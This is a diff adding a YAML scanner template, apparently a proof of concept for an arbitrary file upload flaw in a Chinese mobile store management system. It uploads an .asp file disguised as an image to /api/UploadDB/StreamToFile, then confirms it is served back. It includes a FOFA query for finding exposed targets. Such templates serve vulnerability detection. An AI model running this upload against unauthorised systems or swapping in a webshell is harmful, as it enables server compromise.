@@ -1,0 +1,48 @@
+id: poc-yaml-msms-streamtofile-anyfile-upload
+info:
+  name: 移动门店管理系统 StreamToFile 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 移动门店管理系统
+  fofa: body="西联软件提供云计算服务"
+variables:
+  t1: random_str(4)
+  t2: random_str(4)
+  t3: t1 +"_" + t2
+  t4: base64(t3)
+requests:
+- method: POST
+  path: /api/UploadDB/StreamToFile
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="organ"
+
+
+    {{.t1}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="devid"
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="files";filename="1.asp"
+
+    Content-Type: image/png
+
+
+    {{.t4}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && contains(body,"\"Success\":true") && contains(body,"上传成功")
+    && !contains(body,"<")
+- method: GET
+  path: /Files/DB/{{.t3}}.asp
+  expression: status_code == 200 && body == t4
+transport: http
